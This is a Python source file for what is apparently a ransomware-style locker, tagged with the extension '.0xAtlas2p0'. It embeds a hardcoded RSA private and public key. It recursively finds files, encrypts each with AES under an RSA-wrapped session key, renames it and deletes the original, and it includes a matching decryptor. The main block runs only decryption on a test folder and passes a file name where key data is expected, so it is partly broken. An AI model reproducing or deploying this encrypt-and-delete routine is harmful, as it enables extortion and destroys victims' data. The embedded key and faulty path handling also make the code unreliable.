import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from pathlib import Path

private_key = b'''-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvpCAVBUd3SraMNqSmDGjKCbSopT9D14xLuWXgaKBso7sqtOS
8wskHBOdaHAtOiKhWyVj7wTbq3u8vG4Nk9NDcI16/mFZlxLDyjLwCQCLRM4rpNH6
o+C/fXOMMsX7G4AvDNoyrZk8EcP3C5/drx4oGR3L1FVLdt/GWvkf2aJQEUVCkoy3
2KN33Uo/6UjgdSXeWlWcjDrI6qwDG1n+bCIe2Cw4seK+PjZr5rBeIDk0KmbKkChI
Hds8yg0Z7Z0euPgOTAwqMUXUpXUn7dK2hlidgnwq4PO10SuZ/PaLo61BsIK3F7/q
ZL2vndMgQoPQDIBfuQ3MNN5ghT+0cKc/fMJ9oQIDAQABAoIBAAjc35sJgGIQ5CTx
hW/enx/27kTxePOGBfOQagN1c2LCku8+986l7gAASYnZ7cCOa8K5cnRjXXQURSre
U3NUmAZcDiRWkrwb+08kH1XL2K5SiGUZ/vYwNbe38AVMf+k/hPCsFT9NqSWKX6sC
vGSwmlzQrfIqJWBZ9/ezLnAIxICJC2IBbdRHrYrEl2eJje3dI5BSN3RNKP7JaTrp
LdyDkzJakjNRLrkae+UD7kVnpIp0fC/PwbDw9WjbqrhnijRj5VmWRuAHcE4QVS5Z
XPCFLEkmu4OxAkdinydsrTGWQp5V9e2OcEnIlI3toYBn9AH8Sxg9/gFZaNc/bRBA
HdMew6ECgYEAwqZFUd3tCOWfN/3qvh1b+lEEdwPVHj4bSd12xLIjtveKwM/Vwxrt
9fggTerRv4vmaa81HMDaWyQussBb5L/wMg1dCuSEYSbrJMyfqqVqfGumAGkGQGTA
NACsHysTAJnB8kf7I5QdBCYlIutCtZFoW+Vn5M2Cw+2SwJWWc21/F/cCgYEA+qCe
wuVrsqAjyxmmPfC6URmhH5wqw+AZywU+ioza0YrQHrIPf1AzNiRUqJ8R9XNppbml
xdhp1r6jpVKxN6B/ULKe9RyE8147zCSuZxndmYC+7crdgNAfmDUU9FgPfIDd+Zj6
CfzmsEvSUirJIbWGdFPkihAO1E5qEh5+eyhpIScCgYBrhcGBCaBoa79aBK9pOXqX
ea2HuNw/Cnu0f9udp/HGnlNNUwF39yY/20KtB+u5baRn+NrT+UwlUIVjRJL+d3BN
lcgxvi3KJN97wnTopNt/w089psZHR+BMWZq61OZ4THcwSMbXzneA1TlqYp7FAX+u
U7jiUQvNAy0vqPIk7PVp3QKBgQCJhMiYODo38RaywogtRIF3LpDyP0ZX5AdDFsWS
UGdgwsIflaRbPy5abuTlASNhgspdXNhRDsZERqaUeCM1WqOBLAF8jQGGaBZ3lUj8
2Xx2VeZto/qWS5yKb9XnnMoijrM92WqZQGN0KKZm34MtM+Vqvv2Po+//HmelOYY9
HZdR0QKBgCKyfn/Oggl82Jv1J8ZjpoNTT+yaom7Fjfw9hStxxreGsW0taxxMEk1h
MK4WVNzTaGn6do8KUNWHDhw+VtnHGKxvOzofaBp0vRaWeebIVIeItpERnB6jVXmN
d/VJOA1gujB68DocauDX3f4I4NCEGqaR7Uc9Pk6WS6cSLfSpFzVf
-----END RSA PRIVATE KEY-----'''

public_key = b'''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvpCAVBUd3SraMNqSmDGj
KCbSopT9D14xLuWXgaKBso7sqtOS8wskHBOdaHAtOiKhWyVj7wTbq3u8vG4Nk9ND
cI16/mFZlxLDyjLwCQCLRM4rpNH6o+C/fXOMMsX7G4AvDNoyrZk8EcP3C5/drx4o
GR3L1FVLdt/GWvkf2aJQEUVCkoy32KN33Uo/6UjgdSXeWlWcjDrI6qwDG1n+bCIe
2Cw4seK+PjZr5rBeIDk0KmbKkChIHds8yg0Z7Z0euPgOTAwqMUXUpXUn7dK2hlid
gnwq4PO10SuZ/PaLo61BsIK3F7/qZL2vndMgQoPQDIBfuQ3MNN5ghT+0cKc/fMJ9
oQIDAQAB
-----END PUBLIC KEY-----'''


encryptionExtension = ".0xAtlas2p0"
delimiter = b'$'

def scanRecurse(baseDir):
    
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


def encrypt(dataFile, publicKey):

    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)

    with open(dataFile, 'rb') as f:
        data = f.read()
    

    data = bytes(data)

    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    bytes_extension = extension.encode('utf-8')
    cipher_extension = AES.new(sessionKey, AES.MODE_EAX)
    encrypted_extension, tag_extension = cipher_extension.encrypt_and_digest(bytes_extension)

    try:
        fileName = dataFile.split(extension)[0]
    except:
        print("Unsupported File Type")
        return -1


    encryptedFile = fileName + encryptionExtension

    with open(encryptedFile, 'wb') as f:
        [f.write(x) for x in (encryptedSessionKey, cipher_extension.nonce, tag_extension,
                               encrypted_extension, delimiter, cipher.nonce, tag, ciphertext)]
    os.remove(dataFile)

    print('Encrypted file saved to ' + encryptedFile)


def decrypt(dataFile, privateKey):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''

    # read private key from file
        # create private key object
    key = RSA.import_key(privateKey)

    # read data from file
    with open(dataFile, 'rb') as f:
        # read the session key

        encryptedSessionKey = f.read(key.size_in_bytes())
        ext_nonce = f.read(16)
        tag_extension = f.read(16)
        cipher_extension = b''

        while True:
            byte = f.read(1)
            if byte == delimiter:
                break
            else:
                cipher_extension += byte

        nonce, tag, ciphertext  = [ f.read(x) for x in (16, 16, -1) ]


    # decrypt the session key
    cipher = PKCS1_OAEP.new(key)
    sessionKey = cipher.decrypt(encryptedSessionKey)

    # decrypt the data with the session key

    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    cipher_new = AES.new(sessionKey, AES.MODE_EAX, ext_nonce)
    extension = cipher_new.decrypt_and_verify(cipher_extension, tag_extension)
    
    extension = extension.decode('utf-8')
    [fileName, _] = str(dataFile).split('.')
    decryptedFile = fileName + extension

    # save the decrypted data to file
    
    with open(decryptedFile, 'wb') as f:
        f.write(data)

    print('Decrypted file saved to ' + decryptedFile)
    os.remove(dataFile)
    
if __name__ == "__main__":

    directory = 'test-dir'

    for item in scanRecurse(directory):

        filePath = Path(item)

        decrypt(filePath, 'private.pem')


# To Do: Refactor this garbage